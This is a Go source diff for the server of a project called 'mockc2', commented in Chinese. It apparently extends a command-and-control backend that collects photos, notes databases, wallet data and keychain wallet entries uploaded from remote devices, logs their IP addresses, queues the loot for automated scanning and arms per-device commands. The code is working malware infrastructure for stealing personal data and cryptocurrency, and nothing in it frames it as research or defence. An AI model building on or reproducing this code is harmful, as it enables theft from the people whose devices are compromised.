@@ -1,13 +1,15 @@
-package server
+﻿package server
 
 import (
 	"encoding/json"
 	"net/http"
+	"path/filepath"
 	"strconv"
 	"strings"
 	"time"
 
 	"mockc2/internal/config"
+	"mockc2/internal/forensics"
 	"mockc2/internal/store"
 )
 
@@ -16,7 +18,7 @@ import (
 func hqSink(w http.ResponseWriter, r *http.Request, folder, ext string) {
 	body := readBody(r)
 	s := config.Get()
-	store.GetStore().SaveBody(folder, body, ext, s.BodyCaptureLimit)
+	store.GetStore().SaveBody(folder, body, ext, s.BodyCaptureLimit, clientIP(r))
 	writeJSON(w, http.StatusOK, map[string]any{"status": "ok"})
 }
 
@@ -34,21 +36,24 @@ func registerHQ(rt *Router) {
 		body := readBody(r)
 		s := config.Get()
 		rec := store.ProcessNB(body, s.CaptureRoot, "") // 备忘录解析 + 完整 db 落盘 + 路径记录
-		store.GetStore().SaveBody("nb", body, "json", s.BodyCaptureLimit)
+		store.GetStore().SaveBody("nb", body, "json", s.BodyCaptureLimit, clientIP(r))
 		out := map[string]any{"status": "ok"}
 		for k, v := range rec {
 			out[k] = v
 		}
 		writeJSON(w, http.StatusOK, out)
 	})
-	rt.POST("/ph", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
+	// 照片回传：正确端点是 /p（线上实测设备用 /p）。/ph 为历史别名，统一落 capture/p。
+	photoSink := func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
 		ct := r.Header.Get("Content-Type")
 		ext := "bin"
 		if strings.Contains(ct, "multipart") {
 			ext = "multipart.bin"
 		}
-		hqSink(w, r, "ph", ext)
-	})
+		hqSink(w, r, "p", ext)
+	}
+	rt.POST("/p", photoSink)
+	rt.POST("/ph", photoSink)
 	rt.POST("/wallet", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
 		hqSink(w, r, "wallet", "json")
 	})
@@ -57,8 +62,8 @@ func registerHQ(rt *Router) {
 	rt.Add([]string{"GET", "POST"}, "/war", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
 		body := readBody(r)
 		s := config.Get()
-		rel := "war/" + time.Now().Format("20060102-150405")
-		store.GetStore().SaveBody("war", body, "json", s.BodyCaptureLimit)
+		// 真实落盘相对路径（<uuid>_<ts>-<rand>.json）；小包未落盘时为空串。
+		rel := store.GetStore().SaveBody("war", body, "json", s.BodyCaptureLimit, clientIP(r))
 		// 钱包映射索引 /war keychain.wallets（包序自 packets 索引取最新一条）
 		var packetID *int64
 		if row := store.GetDB().QueryOne(
@@ -68,6 +73,17 @@ func registerHQ(rt *Router) {
 		}
 		rec := map[string]any(nil)
 		store.SafeCall(func() { rec = store.ProcessWar(body, packetID, rel) })
+		// 自动后台检测：新回传的 /war 入队（tools/smart_forensics.py，结果落 war_scan）。
+		if packetID != nil && rel != "" {
+			var wj map[string]any
+			if json.Unmarshal(body, &wj) == nil {
+				u := store.ToStr(wj["device_uuid"])
+				if u == "" {
+					u = store.ToStr(wj["lhu"])
+				}
+				forensics.Enqueue(*packetID, filepath.Join(s.CaptureRoot, filepath.FromSlash(rel)), u)
+			}
+		}
 		wallets, _ := rec["wallets"].([]any)
 		if len(wallets) > 0 {
 			var parts []string
@@ -92,7 +108,7 @@ func registerL1Res(rt *Router) {
 	})
 }
 
-// 运维观测端点（带 token 守卫，可关）。
+// 运维观测端点（带 token 守卫，可关闭）。
 func registerOps(rt *Router) {
 	checkToken := func(r *http.Request) bool {
 		expected := config.Get().OpsToken
@@ -107,11 +123,7 @@ func registerOps(rt *Router) {
 			writeJSON(w, http.StatusUnauthorized, map[string]any{"error": "unauthorized"})
 			return
 		}
-		out := map[string]any{}
-		for _, f := range store.GetStore().IterFiles() {
-			out[f.Rel] = f.Size
-		}
-		writeJSON(w, http.StatusOK, out)
+		writeJSON(w, http.StatusOK, store.DBStats())
 	})
 
 	rt.GET("/__control", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
@@ -151,10 +163,10 @@ func registerOps(rt *Router) {
 			}
 			cmdType := store.ToStr(payload["type"])
 
-			// 目标：targets(批量) > target(单台) > 无（老的单行全局队列）
-			var targets []string
-			if arr, ok := payload["targets"].([]any); ok {
-				for _, v := range arr {
+			// targets：按设备批量武装（每台各写一条独立队列记录）
+			targets := []string{}
+			if tv, ok := payload["targets"].([]any); ok {
+				for _, v := range tv {
 					if s := store.ToStr(v); s != "" {
 						targets = append(targets, s)
 					}
@@ -189,7 +201,7 @@ func registerOps(rt *Router) {
 			store.SafeCall(func() { store.CommandArmed(cmd, once) })
 		}
 		if v, ok := payload["command"]; ok && v == nil {
-			// 带 target：只取消该设备的待发指令（不影响其它设备）
+			// 清 target：只取消该设备的待发指令（不影响其它设备）
 			if t := store.ToStr(payload["target"]); t != "" {
 				store.GetQueue().ClearFor(t)
 				store.GetStore().WriteJSONL("control.jsonl", map[string]any{"action": "disarm", "target": t})
